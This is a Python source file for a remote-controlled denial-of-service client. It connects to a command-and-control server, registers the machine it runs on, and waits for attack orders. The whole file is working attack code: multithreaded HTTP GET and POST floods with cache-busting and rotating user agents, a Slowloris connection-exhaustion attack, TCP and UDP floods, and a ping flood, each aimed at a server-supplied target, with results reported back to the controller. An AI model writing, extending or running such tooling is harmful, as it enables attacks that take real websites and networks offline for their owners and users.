#!/usr/bin/env python3
"""
C2 Client - Real Layer 4-7 Attack Implementation
Sends REAL requests with multiple methods
"""
import socketio
import requests
import socket
import struct
import random
import string
import threading
import time
import sys
import os
import platform
import psutil
from datetime import datetime
from urllib.parse import urlparse
from queue import Queue

class RealAttackEngine:
    """Real attack engine with actual network requests"""
    
    def __init__(self):
        self.running = False
        self.stats = {
            'requests': 0,
            'success': 0,
            'failed': 0,
            'bytes_sent': 0
        }
        self.stats_lock = threading.Lock()
        
    def generate_random_string(self, length=10):
        """Generate random string for cache busting"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def generate_user_agent(self):
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15'
        ]
        return random.choice(agents)
    
    # ============= LAYER 7 ATTACKS (HTTP) =============
    
    def http_get_flood(self, target, duration, threads=10):
        """Layer 7: HTTP GET flood with real requests"""
        print(f"[L7] Starting HTTP GET flood on {target}")
        self.running = True
        thread_pool = []
        
        def worker():
            session = requests.Session()
            session.headers.update({'User-Agent': self.generate_user_agent()})
            
            while self.running and time.time() - start_time < duration:
                try:
                    # Cache busting
                    cache_buster = f"?{self.generate_random_string()}={random.randint(1, 999999)}"
                    url = target + cache_buster
                    
                    # Send real GET request
                    response = session.get(url, timeout=5, allow_redirects=False)
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['bytes_sent'] += len(response.content)
                        if response.status_code < 500:
                            self.stats['success'] += 1
                        else:
                            self.stats['failed'] += 1
                            
                except Exception as e:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                
                time.sleep(0.001)  # Small delay
        
        start_time = time.time()
        
        # Create worker threads
        for i in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_pool.append(t)
        
        # Wait for completion
        for t in thread_pool:
            t.join()
        
        return self.stats.copy()
    
    def http_post_flood(self, target, duration, threads=10):
        """Layer 7: HTTP POST flood with real data"""
        print(f"[L7] Starting HTTP POST flood on {target}")
        self.running = True
        thread_pool = []
        
        def worker():
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.generate_user_agent(),
                'Content-Type': 'application/x-www-form-urlencoded'
            })
            
            while self.running and time.time() - start_time < duration:
                try:
                    # Generate random POST data
                    data = {
                        'search': self.generate_random_string(20),
                        'q': self.generate_random_string(15),
                        'data': self.generate_random_string(50),
                        'id': random.randint(1, 999999)
                    }
                    
                    # Send real POST request
                    response = session.post(target, data=data, timeout=5, allow_redirects=False)
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['bytes_sent'] += len(str(data))
                        if response.status_code < 500:
                            self.stats['success'] += 1
                        else:
                            self.stats['failed'] += 1
                            
                except Exception as e:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                
                time.sleep(0.001)
        
        start_time = time.time()
        
        for i in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_pool.append(t)
        
        for t in thread_pool:
            t.join()
        
        return self.stats.copy()
    
    def http_slowloris(self, target, duration, connections=200):
        """Layer 7: Slowloris attack - keeps connections open"""
        print(f"[L7] Starting Slowloris attack on {target}")
        self.running = True
        
        parsed = urlparse(target)
        host = parsed.netloc.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in parsed.netloc else (443 if parsed.scheme == 'https' else 80)
        
        sockets = []
        
        def create_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                
                # Send partial HTTP request
                s.send(f"GET {parsed.path or '/'} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send(f"User-Agent: {self.generate_user_agent()}\r\n".encode())
                
                return s
            except:
                return None
        
        start_time = time.time()
        
        # Create initial connections
        print(f"[L7] Creating {connections} slow connections...")
        for i in range(connections):
            s = create_socket()
            if s:
                sockets.append(s)
                with self.stats_lock:
                    self.stats['requests'] += 1
        
        print(f"[L7] Created {len(sockets)} connections, keeping alive...")
        
        # Keep connections alive
        while self.running and time.time() - start_time < duration:
            for s in list(sockets):
                try:
                    # Send partial header to keep alive
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    with self.stats_lock:
                        self.stats['success'] += 1
                except:
                    sockets.remove(s)
                    # Create new connection
                    new_s = create_socket()
                    if new_s:
                        sockets.append(new_s)
            
            time.sleep(15)  # Send keep-alive every 15 seconds
        
        # Close all connections
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        return self.stats.copy()
    
    # ============= LAYER 4 ATTACKS (TCP/UDP) =============
    
    def tcp_syn_flood(self, target, duration, threads=10):
        """Layer 4: TCP SYN flood"""
        print(f"[L4] Starting TCP SYN flood on {target}")
        self.running = True
        
        parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
        host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
        
        thread_pool = []
        
        def worker():
            while self.running and time.time() - start_time < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    s.connect((host, port))
                    s.send(b'GET / HTTP/1.1\r\n\r\n')
                    s.close()
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['success'] += 1
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
        
        start_time = time.time()
        
        for i in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_pool.append(t)
        
        for t in thread_pool:
            t.join()
        
        return self.stats.copy()
    
    def udp_flood(self, target, duration, threads=10, packet_size=1024):
        """Layer 4: UDP flood"""
        print(f"[L4] Starting UDP flood on {target}")
        self.running = True
        
        parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
        host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
        
        thread_pool = []
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(packet_size)
            
            while self.running and time.time() - start_time < duration:
                try:
                    sock.sendto(payload, (host, port))
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['bytes_sent'] += packet_size
                        self.stats['success'] += 1
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
        
        start_time = time.time()
        
        for i in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_pool.append(t)
        
        for t in thread_pool:
            t.join()
        
        return self.stats.copy()
    
    # ============= LAYER 3 ATTACKS (ICMP) =============
    
    def icmp_flood(self, target, duration, threads=5):
        """Layer 3: ICMP ping flood"""
        print(f"[L3] Starting ICMP flood on {target}")
        self.running = True
        
        host = urlparse(target).netloc if target.startswith('http') else target
        host = host.split(':')[0]
        
        thread_pool = []
        
        def worker():
            # Use system ping command for ICMP
            import subprocess
            
            while self.running and time.time() - start_time < duration:
                try:
                    # Rapid ping
                    if platform.system().lower() == 'windows':
                        cmd = ['ping', '-n', '1', '-w', '100', host]
                    else:
                        cmd = ['ping', '-c', '1', '-W', '1', host]
                    
                    result = subprocess.run(cmd, capture_output=True, timeout=1)
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        if result.returncode == 0:
                            self.stats['success'] += 1
                        else:
                            self.stats['failed'] += 1
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                
                time.sleep(0.01)
        
        start_time = time.time()
        
        for i in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_pool.append(t)
        
        for t in thread_pool:
            t.join()
        
        return self.stats.copy()

class Layer7Client:
    """Client that runs real attacks"""
    
    def __init__(self, server_url='http://localhost:5000', client_name=None):
        self.server_url = server_url
        self.client_name = client_name or f"{platform.node()}_{platform.system()}"
        
        self.sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=0,
            reconnection_delay=1,
            reconnection_delay_max=5,
            logger=False,
            engineio_logger=False
        )
        
        self.current_attack = None
        self.running = False
        self.attack_thread = None
        self.attack_engine = RealAttackEngine()
        
        self.setup_handlers()
        
        self.client_info = {
            'name': self.client_name,
            'hostname': platform.node(),
            'platform': platform.platform(),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
            'python_version': platform.python_version(),
            'has_layer7': True
        }
    
    def setup_handlers(self):
        """Setup SocketIO event handlers"""
        @self.sio.event
        def connect():
            print(f"✅ Connected to C2 Server: {self.server_url}")
            self.register_client()
        
        @self.sio.event
        def connect_error(data):
            print(f"❌ Connection failed: {data}")
            print("💡 Retrying connection...")
        
        @self.sio.event
        def disconnect():
            print("❌ Disconnected from server")
            print("🔄 Attempting to reconnect...")
            self.running = False
        
        @self.sio.event
        def welcome(data):
            print(f"📢 Server: {data['message']}")
        
        @self.sio.event
        def attack_command(data):
            print(f"\n🎯 Received attack command")
            print(f"   Target: {data.get('target')}")
            print(f"   Method: {data.get('method')}")
            print(f"   Duration: {data.get('duration')}s")
            
            if data.get('command') == 'start':
                self.current_attack = data.get('attack_id')
                self.start_attack(data)
            elif data.get('command') == 'stop':
                self.stop_attack()
    
    def register_client(self):
        """Register client with server"""
        try:
            self.sio.emit('client_register', self.client_info)
            print(f"✅ Registered as: {self.client_name}")
        except Exception as e:
            print(f"⚠️ Registration error: {e}")
    
    def start_attack(self, attack_data):
        """Start attack execution"""
        if self.attack_thread and self.attack_thread.is_alive():
            print("⚠️ Another attack is already running")
            return
        
        self.running = True
        self.attack_thread = threading.Thread(
            target=self.execute_attack,
            args=(attack_data,),
            daemon=True
        )
        self.attack_thread.start()
        
        try:
            self.sio.emit('attack_started', {
                'attack_id': attack_data.get('attack_id'),
                'target': attack_data.get('target')
            })
        except Exception as e:
            print(f"⚠️ Failed to notify server: {e}")
    
    def execute_attack(self, attack_data):
        """Execute real attack"""
        attack_id = attack_data.get('attack_id')
        target = attack_data.get('target')
        method = attack_data.get('method', 'http').lower()
        duration = attack_data.get('duration', 60)
        
        # Calculate thread count based on CPU
        cpu_count = psutil.cpu_count()
        threads = min(cpu_count * 20, 200)  # Max 200 threads
        
        try:
            print(f"\n{'='*60}")
            print(f"🚀 EXECUTING REAL ATTACK")
            print(f"   Target: {target}")
            print(f"   Method: {method.upper()}")
            print(f"   Duration: {duration}s")
            print(f"   Threads: {threads}")
            print(f"{'='*60}\n")
            
            start_time = time.time()
            
            # Reset stats
            self.attack_engine.stats = {
                'requests': 0, 'success': 0, 'failed': 0, 'bytes_sent': 0
            }
            
            # Execute attack based on method
            if method == 'http' or method == 'get':
                results = self.attack_engine.http_get_flood(target, duration, threads)
            elif method == 'post':
                results = self.attack_engine.http_post_flood(target, duration, threads)
            elif method == 'slowloris':
                results = self.attack_engine.http_slowloris(target, duration, min(threads, 200))
            elif method == 'tcp':
                results = self.attack_engine.tcp_syn_flood(target, duration, threads)
            elif method == 'udp':
                results = self.attack_engine.udp_flood(target, duration, threads)
            elif method == 'icmp' or method == 'ping':
                results = self.attack_engine.icmp_flood(target, duration, min(threads, 10))
            else:
                # Default to HTTP GET
                results = self.attack_engine.http_get_flood(target, duration, threads)
            
            elapsed = time.time() - start_time
            actual_rps = results['requests'] / elapsed if elapsed > 0 else 0
            success_rate = (results['success'] / results['requests'] * 100) if results['requests'] > 0 else 0
            
            # Report completion
            try:
                self.sio.emit('attack_complete', {
                    'attack_id': attack_id,
                    'results': {
                        'requests': results['requests'],
                        'success': success_rate,
                        'rps': actual_rps,
                        'duration': elapsed,
                        'method': method,
                        'bytes_sent': results['bytes_sent']
                    }
                })
            except Exception as e:
                print(f"⚠️ Failed to report completion: {e}")
            
            print(f"\n✅ Attack completed in {elapsed:.1f}s")
            print(f"   Total Requests: {results['requests']:,}")
            print(f"   Successful: {results['success']:,}")
            print(f"   Failed: {results['failed']:,}")
            print(f"   RPS: {actual_rps:.1f}")
            print(f"   Success Rate: {success_rate:.1f}%")
            print(f"   Data Sent: {results['bytes_sent'] / 1024 / 1024:.2f} MB")
            
        except Exception as e:
            print(f"\n❌ Attack error: {str(e)}")
            try:
                self.sio.emit('attack_error', {
                    'attack_id': attack_id,
                    'error': str(e)
                })
            except:
                pass
        finally:
            self.running = False
            self.attack_engine.running = False
            self.current_attack = None
    
    def stop_attack(self):
        """Stop current attack"""
        self.running = False
        self.attack_engine.running = False
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        self.current_attack = None
        print("🛑 Attack stopped by server")
    
    def report_stats(self):
        """Report statistics to server"""
        while True:
            try:
                if self.sio.connected and not self.running:
                    cpu_usage = psutil.cpu_percent(interval=1)
                    memory_usage = psutil.virtual_memory().percent
                    
                    stats = {
                        'cpu_usage': cpu_usage,
                        'memory_usage': memory_usage,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.sio.emit('client_stats', {'stats': stats})
                
                time.sleep(10)
            except:
                time.sleep(10)
    
    def connect(self):
        """Connect to server and start monitoring"""
        try:
            print("\n" + "="*60)
            print("🤖 LAYER7 Real Attack Client")
            print(f"🔗 Connecting to: {self.server_url}")
            print(f"🏷️  Client: {self.client_name}")
            print(f"💻 Platform: {platform.platform()}")
            print(f"⚡ CPUs: {psutil.cpu_count()} cores")
            print(f"💾 RAM: {psutil.virtual_memory().total / 1024 / 1024 / 1024:.1f} GB")
            print("="*60 + "\n")
            
            print("⚡ Connecting...")
            print("📡 This may take 10-30 seconds for Render servers...")
            
            self.sio.connect(
                self.server_url,
                wait_timeout=30,
                transports=['websocket', 'polling']
            )
            
            print("\n✅ Connection successful!")
            print("📡 Waiting for attack commands from server...")
            print("⚡ Press Ctrl+C to disconnect\n")
            
            stats_thread = threading.Thread(target=self.report_stats, daemon=True)
            stats_thread.start()
            
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n🛑 Client stopped by user")
            self.disconnect()
        except Exception as e:
            print(f"\n❌ Connection error: {str(e)}")
            print("\n💡 Troubleshooting tips:")
            print("   1. Check if server URL is correct")
            print("   2. Make sure server is running")
            print("   3. Check your internet connection")
            print("   4. Wait 30s if server was sleeping")
            self.disconnect()
    
    def disconnect(self):
        """Disconnect from server"""
        self.running = False
        self.attack_engine.running = False
        if self.sio.connected:
            try:
                self.sio.disconnect()
            except:
                pass

def main():
    """Main function"""
    print("""
    ╔══════════════════════════════════════╗
    ║    LAYER7 REAL ATTACK CLIENT        ║
    ║    Sends REAL network requests      ║
    ║    Layer 3-7 Support                ║
    ╚══════════════════════════════════════╝
    """)
    
    default_server = "https://c2-server-io.onrender.com"
    
    server_url = input(f"🌐 C2 Server URL [{default_server}]: ").strip()
    if not server_url:
        server_url = default_server
    
    if not server_url.startswith('http'):
        server_url = 'https://' + server_url
    
    client_name = input(f"🏷️  Client Name [{platform.node()}]: ").strip()
    if not client_name:
        client_name = platform.node()
    
    client = Layer7Client(server_url=server_url, client_name=client_name)
    client.connect()

if __name__ == "__main__":
    main()
